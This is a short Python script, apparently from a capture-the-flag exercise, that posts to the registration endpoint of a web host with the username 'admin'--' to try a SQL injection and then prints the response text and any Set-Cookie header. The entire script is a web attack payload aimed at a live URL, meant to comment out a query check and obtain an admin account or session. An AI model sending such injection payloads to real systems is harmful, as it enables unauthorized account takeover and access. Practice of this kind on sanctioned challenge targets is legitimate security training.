import requests
# Try to register with SQL injection
r = requests.post('https://web-random-cheese.tracebash.xyz/register', data={'username': "admin'--", 'password': 'test'})
print(r.text[:500])
print(r.headers.get('Set-Cookie', ''))